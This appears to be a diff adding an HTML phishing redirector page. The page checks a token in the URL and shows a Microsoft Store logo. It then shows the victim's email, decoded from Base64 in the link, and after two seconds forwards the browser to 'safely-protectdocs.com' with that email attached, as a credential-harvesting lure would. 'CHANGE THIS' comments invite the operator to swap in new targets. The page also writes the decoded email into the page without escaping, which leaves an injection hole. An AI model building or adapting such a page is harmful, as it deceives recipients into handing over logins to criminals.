@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        img {
+            width: 430px; /* Increased logo size */
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .email-text {
+            font-size: 18px; /* Normal size for email */
+            font-weight: normal; /* Regular weight */
+            color: #333; /* Slightly darker text for email */
+            margin-bottom: 20px;
+        }
+        .loading {
+            font-size: 24px; /* Slightly smaller for loading dots */
+            font-weight: normal;
+            color: #666; /* Lighter color for the loading dots */
+        }
+    </style>
+    <script>
+        window.onload = function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const fullParam = window.location.search.substring(1); // Remove '?' from URL
+            const [token, email] = fullParam.split("="); // Split token and email part
+
+            const tokenPattern = /^[A-Z]{20}[a-z]{20}[0-9]{8}=$/; // Regex pattern for validation
+
+            // Validate token format
+            if (!tokenPattern.test(token + "=")) {
+                document.body.innerHTML = "<h2>Invalid Token</h2>";
+                return;
+            }
+
+            // Set your logo image and redirect URL
+            const imageUrl = "https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c"; // CHANGE THIS
+            let redirectUrl = "https://safely-protectdocs.com/?ycxehohw"; // CHANGE THIS
+
+            // Decode email if it's in Base64
+            let decodedEmail = "";
+            if (email) {
+                try {
+                    decodedEmail = atob(email);
+                } catch (e) {
+                    decodedEmail = email; // If it's not Base64, use as is
+                }
+                redirectUrl += `?email=${encodeURIComponent(decodedEmail)}`; // Append email to final URL
+            }
+
+            // Display image
+            document.body.innerHTML = `<img src="${imageUrl}" alt="Loading..."><br>`;
+
+            // Display email (if provided)
+            if (decodedEmail) {
+                document.body.innerHTML += `<div class="email-text">${decodedEmail}</div><br>`;
+            }
+
+            // Display loading dots
+            let loadingText = document.createElement("div");
+            loadingText.className = "loading";
+            document.body.appendChild(loadingText);
+
+            let dots = 0;
+            setInterval(() => {
+                dots = (dots + 1) % 4;
+                loadingText.innerHTML = ".".repeat(dots);
+            }, 500);
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2000);
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
